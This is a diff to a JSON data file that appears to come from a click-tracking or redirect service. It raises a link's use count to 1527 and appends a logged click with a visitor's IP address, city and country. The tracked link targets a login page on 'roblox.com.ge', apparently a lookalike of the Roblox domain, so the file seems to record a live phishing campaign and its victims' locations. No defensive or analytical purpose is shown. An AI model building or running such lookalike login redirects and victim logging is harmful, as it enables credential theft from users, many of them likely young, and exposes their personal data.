@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1526,
+    "useCount": 1527,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12376,6 +12376,14 @@
         "city": "Vigo",
         "flag": "🇪🇸",
         "countryCode": "ES"
+      },
+      {
+        "timestamp": 1777447673639,
+        "ip": "157.10.33.114",
+        "country": "Philippines",
+        "city": "Hagonoy",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
